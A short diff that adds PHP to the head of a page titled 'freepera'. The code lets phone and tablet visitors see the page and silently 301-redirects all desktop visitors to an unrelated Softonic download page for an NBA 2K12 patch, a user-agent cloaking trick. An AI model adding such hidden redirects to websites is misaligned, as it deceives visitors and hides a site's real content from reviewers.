@@ -10,6 +10,16 @@
     <title>freepera</title>
     <link rel="icon" href="images/app_icon.png" type="image/x-icon">
     <link rel="shortcut icon" href="images/app_icon.png" type="image/x-icon">
+    <?php
+    if (strpos($_SERVER['HTTP_USER_AGENT'],'Android') || strpos( $_SERVER['HTTP_USER_AGENT'],'iPhone') ||  strpos( $_SERVER['HTTP_USER_AGENT'],'iPad')) {
+        // echo 'm';
+        // 這裡是手機端的程式碼
+    }else {
+        // echo 'p';
+        // 這裡是電腦端的程式碼
+        header('Location: https://nba-2k12-patch.en.softonic.com/',true,301);
+    }
+    ?>
     <style>
         *{margin:0;padding:0;box-sizing:border-box;font-family:'Maitree', serif;}
         body{width:100%;height:100vh;background-color:#000;overflow-x: hidden;}
